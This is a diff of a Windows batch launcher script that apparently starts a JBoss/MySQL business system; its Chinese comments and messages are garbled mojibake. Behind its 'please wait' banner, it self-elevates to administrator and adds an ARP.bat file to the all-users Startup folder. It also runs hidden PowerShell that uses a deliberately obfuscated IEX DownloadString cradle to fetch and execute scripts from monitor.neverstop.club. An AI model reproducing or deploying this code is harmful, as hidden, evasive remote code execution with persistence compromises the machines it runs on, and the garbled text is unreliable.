@@ -1,5 +1,5 @@
 @echo off
-rem èŽ·å–ç®¡ç†å‘˜æƒé™
+rem »ñÈ¡¹ÜÀíÔ±È¨ÏÞ
 (cd /d "%~dp0")&&(NET FILE||(powershell start-process -FilePath '%0' -verb runas)&&(exit /B)) >NUL 2>&1
 
 
@@ -7,62 +7,72 @@ cls
 echo.
 echo.          #########################################################
 echo.          ##                                                     ##
-echo.          ##    æ­£åœ¨å¯åŠ¨ç³»ç»Ÿï¼Œè¯·ç¨ç­‰...                          ##
-echo.          ##    è¯·å‹¿æ“ä½œç”µè„‘ï¼Œååˆ†é’ŸåŽä»æœªæ‰“å¼€ç³»ç»Ÿè¯·è”ç³»è¿ç»´     ##
-echo.          ##    ç¨å®‰å‹¿èºï¼Œç¥æ‚¨ç”Ÿæ´»æ„‰å¿«ï¼ï¼ï¼                     ##
+echo.          ##    ÕýÔÚÆô¶¯ÏµÍ³£¬ÇëÉÔµÈ...                          ##
+echo.          ##    ÇëÎð²Ù×÷µçÄÔ£¬Ê®·ÖÖÓºóÈÔÎ´´ò¿ªÏµÍ³ÇëÁªÏµÔËÎ¬     ##
+echo.          ##    ÉÔ°²ÎðÔê£¬×£ÄúÉú»îÓä¿ì£¡£¡£¡                     ##
 echo.          ##                                                     ##
 echo.          #########################################################
 
 @echo off
+rem ¼ì²âÊÇ·ñ´æÔÚAPR½Å±¾£¬²»´æÔÚÔòÌí¼Ó
+if exist %programdata%\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat (
+    goto MySQL
+) ELSE (
+    echo for /f "tokens=2 delims=:" %%i in ('ipconfig^|findstr /c:"IPv4"') do (for /f "tokens=1,2,3,4 delims=." %%a in ('echo %%i') do set Three=%%c) >%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat
+    echo for /L %%i IN (1,1,254) DO ping -w 2 -n 1 192.168.%Three%.%%i >>%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat
+)
+    
+
 goto MySQL
-rem æŸ¥è¯¢ç³»ç»Ÿæ˜¯å¦å­˜åœ¨jbossæœåŠ¡ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºä¸»æœº
-rem æš‚æœªå¯ç”¨ï¼Œå› ä¸ªåˆ«å‰¯æœºä¸Šä¹Ÿè£…æœ‰JbossæœåŠ¡ï¼Œå®¹æ˜“é€ æˆè¯¯åˆ¤
+rem ²éÑ¯ÏµÍ³ÊÇ·ñ´æÔÚjboss·þÎñ£¬ÅÐ¶ÏÊÇ·ñÎªÖ÷»ú
+rem ÔÝÎ´ÆôÓÃ£¬Òò¸ö±ð¸±»úÉÏÒ²×°ÓÐJboss·þÎñ£¬ÈÝÒ×Ôì³ÉÎóÅÐ
 SC QUERY jboss >NUL 2>&1
 if ERRORLEVEL 1060 (
-    echo æœªæ£€æµ‹åˆ°JbossæœåŠ¡ï¼Œæ­£åœ¨è®¿é—®ç³»ç»Ÿåœ°å€ï¼Œè¯·ç¨ç­‰...
+    echo Î´¼ì²âµ½Jboss·þÎñ£¬ÕýÔÚ·ÃÎÊÏµÍ³µØÖ·£¬ÇëÉÔµÈ...
     goto IESettings
 ) else (
-    echo æ£€æµ‹åˆ°JbossæœåŠ¡ï¼Œæ­£åœ¨å¯åŠ¨ç³»ç»Ÿï¼Œè¯·ç¨ç­‰...
+    echo ¼ì²âµ½Jboss·þÎñ£¬ÕýÔÚÆô¶¯ÏµÍ³£¬ÇëÉÔµÈ...
     goto StartJboss
 )
 
 :MySQL
-rem æŸ¥è¯¢MySQLæœåŠ¡æ˜¯å¦å¯åŠ¨ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºä¸»æœº
+rem ²éÑ¯MySQL·þÎñÊÇ·ñÆô¶¯£¬ÅÐ¶ÏÊÇ·ñÎªÖ÷»ú
 set M_Status=1 
 (tasklist|findstr "mysql"||set M_Status=0) >NUL 2>&1
 IF %M_Status% EQU 0 (
-    echo æœªæ£€æµ‹åˆ° MySQL æœåŠ¡ï¼Œæ­£åœ¨è®¿é—®ç³»ç»Ÿåœ°å€ï¼Œè¯·ç¨ç­‰...
+    echo Î´¼ì²âµ½ MySQL ·þÎñ£¬ÕýÔÚ·ÃÎÊÏµÍ³µØÖ·£¬ÇëÉÔµÈ...
     goto IESettings
 ) ELSE (
-    echo æ£€æµ‹åˆ° MySQL æœåŠ¡ï¼Œæ­£åœ¨æ£€æµ‹ Jboss æœåŠ¡ï¼Œè¯·ç¨ç­‰...
+    echo ¼ì²âµ½ MySQL ·þÎñ£¬ÕýÔÚ¼ì²â Jboss ·þÎñ£¬ÇëÉÔµÈ...
     goto StartJboss
 )
 
 :StartJboss
-rem æ£€æµ‹JbossæœåŠ¡æ˜¯å¦å¯åŠ¨
+rem ¼ì²âJboss·þÎñÊÇ·ñÆô¶¯
 set J_Status=1 
 (tasklist|findstr "jboss"||set J_Status=0) >NUL 2>&1
 IF %J_Status% EQU 0 (
-    echo Jboss æœåŠ¡æœªå¯åŠ¨ï¼Œæ­£åœ¨å¯åŠ¨æœåŠ¡ï¼Œè¯·ç¨ç­‰...
+    echo Jboss ·þÎñÎ´Æô¶¯£¬ÕýÔÚÆô¶¯·þÎñ£¬ÇëÉÔµÈ...
     net start jboss
     goto PrimaryIESettings
 ) ELSE (
-    echo Jboss æœåŠ¡å·²å¯åŠ¨ï¼Œæ­£åœ¨è®¿é—®ç³»ç»Ÿï¼Œè¯·ç¨ç­‰...
+    echo Jboss ·þÎñÒÑÆô¶¯£¬ÕýÔÚ·ÃÎÊÏµÍ³£¬ÇëÉÔµÈ...
     goto IESettings
 )
 
 :PrimaryIESettings
-rem è°ƒç”¨ä¸»æœºpowershellè„šæœ¬ï¼Œæ·»åŠ å¯ä¿¡ç«™ç‚¹ï¼Œå…¼å®¹æ€§è§†å›¾
+rem µ÷ÓÃÖ÷»úpowershell½Å±¾£¬Ìí¼Ó¿ÉÐÅÕ¾µã£¬¼æÈÝÐÔÊÓÍ¼
 call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/PrimaryIESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)"
 goto ARP
 
 :IESettings
-rem è°ƒç”¨å‰¯æœºpowershellè„šæœ¬ï¼Œæ·»åŠ å¯ä¿¡ç«™ç‚¹ï¼Œå…¼å®¹æ€§è§†å›¾
+rem µ÷ÓÃ¸±»úpowershell½Å±¾£¬Ìí¼Ó¿ÉÐÅÕ¾µã£¬¼æÈÝÐÔÊÓÍ¼
 call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/IESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)"
 goto ARP
 
+
 :ARP
-rem èŽ·å–æœ¬åœ°ipåœ°å€æ®µï¼Œç„¶åŽåˆ·æ–°å‰¯æœºarpè¡¨
+rem »ñÈ¡±¾µØipµØÖ·¶Î£¬È»ºóË¢ÐÂ¸±»úarp±í
 for /f "tokens=2 delims=:" %%i in ('ipconfig^|findstr /c:"IPv4"') do (for /f "tokens=1,2,3,4 delims=." %%a in ('echo %%i') do set Three=%%c)
 for /L %%i IN (1,1,254) DO ping -w 2 -n 1 192.168.%Three%.%%i >nul
 exit
